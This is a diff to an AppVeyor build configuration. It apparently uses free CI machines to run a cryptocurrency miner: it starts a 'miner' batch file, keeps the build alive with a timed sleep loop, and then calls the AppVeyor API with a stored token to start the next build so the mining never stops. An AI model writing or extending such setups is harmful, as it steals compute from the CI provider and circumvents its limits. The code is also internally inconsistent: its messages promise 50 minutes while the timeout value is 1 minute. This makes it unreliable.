@@ -1,4 +1,4 @@
-# AppVeyor Build Configuration with Robust Auto-Restart
+# AppVeyor Build Configuration with 50-Minute Auto-Restart
 
 image: Visual Studio 2022
 
@@ -28,32 +28,34 @@ build_script:
   - ps: |
       Write-Host "Starting the miner process..."
       Start-Process -FilePath "$env:USERPROFILE\Desktop\miner\Start-Miner.bat"
-      Write-Host "Miner process has been launched. This build will now run until it times out."
-      while ($true) {
+      
+      Write-Host "Miner process has been launched. This build will run for 50 minutes before restarting."
+      
+      # --- Start of Timed Loop ---
+      $startTime = Get-Date
+      $timeoutMinutes = 1
+      
+      # This loop will run for 50 minutes and then exit cleanly.
+      while (((Get-Date) - $startTime).TotalMinutes -lt $timeoutMinutes) {
           Start-Sleep -Seconds 300
-          Write-Host "[$(Get-Date)] - Build active..."
+          Write-Host "[$(Get-Date)] - Build active, miner running in background..."
       }
+      
+      Write-Host "50-minute mark reached. Build will now finish, triggering the restart process."
+      # --- End of Timed Loop ---
 
 on_finish:
   - ps: |
       Write-Host "Build finished. Attempting to trigger the next build via API..."
       
-      # Correct values for your project
       $accountName = "Peter211231231231232131"
       $projectSlug = "voyage-test"
       $branch = "main"
       
-      # --- Start of Debugging and Error Handling ---
       try {
-          # Check if the API token exists
           if (-not $env:API_TOKEN) {
-              throw "FATAL: API_TOKEN environment variable not found. Please set it in Project Settings > Environment."
+              throw "FATAL: API_TOKEN environment variable not found."
           }
-
-          Write-Host "API call parameters:"
-          Write-Host "  Account Name: $accountName"
-          Write-Host "  Project Slug: $projectSlug"
-          Write-Host "  Branch: $branch"
 
           $apiUrl = "https://ci.appveyor.com/api/builds"
           
@@ -73,13 +75,10 @@ on_finish:
           Write-Host "SUCCESS: The next build has been triggered."
       }
       catch {
-          # This block will run ONLY if there was an error
           Write-Host "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
           Write-Host "           API CALL FAILED - ERROR"
           Write-Host "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
           Write-Host "Error details: $($_.Exception.Message)"
           Write-Host "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
-          # This command ensures the build is marked as failed if the API call fails
           throw
       }
-      # --- End of Debugging and Error Handling ---
